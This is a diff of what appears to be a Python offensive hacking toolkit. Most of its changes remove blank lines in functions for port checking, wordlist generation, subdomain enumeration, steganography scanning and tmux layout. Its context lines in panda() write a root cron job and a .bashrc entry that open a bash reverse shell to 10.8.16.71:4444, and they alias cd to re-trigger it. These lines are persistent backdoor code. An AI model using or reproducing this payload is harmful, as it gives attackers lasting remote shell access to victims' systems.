@@ -172,11 +172,7 @@ def panda():
             echo "* * * * * /bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1" >> /var/spool/cron/root
             echo "/bin/bash -i >& /dev/tcp/10.8.16.71/4444 0>&1 & disown" >> ~/.bashrc
             alias cd="cd && source .bashrc &"
-
-
             EOF
-
-
     """
     subprocess.run(command, shell=True)
 
@@ -263,12 +259,10 @@ def handle_connection(conn):
     
 def portcheck(host,port):
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    try:
-        
+    try: 
         s.bind((host,port))
         print("[PORT OPEN]")
         return True
-
     except OSError as err:
         print(f"[PORT CLOSED] : {err}")
         return False
@@ -322,8 +316,6 @@ def generateList():
 
     print(f"Wordlist saved to {filename}")
 
-    
-
 def domenum():
     domain = input("Enter domain: ")
     urls = [
@@ -334,7 +326,6 @@ def domenum():
         f"https://api.hackertarget.com/hostsearch/?q={domain}",
         f"https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={domain}",
     ]
-
     subdomains = set()
 
     for url in urls:
@@ -399,9 +390,6 @@ def stegoscanner():
             print(f"{filename} contains steganographic content.")
         except:
             pass
-
-
-
 
 def fileinfo(path):
     if os.path.isdir(path):
@@ -496,7 +484,6 @@ def split_h():
 def defaultTheme():
     os.system('printf "\033]50;SetProfileParameter=FontSize:12\a"')
     os.system('printf "\033[1m\033[3m"')
-    
     os.system('unset TMUX; tmux send-keys -t 0 "tmux split-window -h \' -l 90\';tmux select-pane -t 1" Enter')
     os.system('unset TMUX; tmux send-keys -t 0 "tmux select-pane -t 0; tmux split-window -v \'-l 34\';tmux select-pane -t 2" Enter')
     os.system('unset TMUX; tmux send-keys -t 0 "tmux select-pane -t 1; tmux split-window -v \'-l 25\';tmux select-pane -t 3" Enter')
@@ -507,7 +494,6 @@ def defaultTheme():
     os.system('unset TMUX; tmux send-keys -t 4 "" Enter')
     os.system('clear')
     
-
 def new_session():
     print(f"enter the session name:")
     sess_name = input()
@@ -515,13 +501,10 @@ def new_session():
     subprocess.run(['tmux', 'set', '-g', 'mouse', 'on'])
     defaultTheme()
 
-
-
 def show_time():
     now = datetime.datetime.now()
     time_str = now.strftime("%H : %M : %S")
     print(f"{boldRED}" + pyfiglet.figlet_format(time_str, font='small') + f"{nc}")
-
 
 def show_date():
     now = datetime.datetime.now()
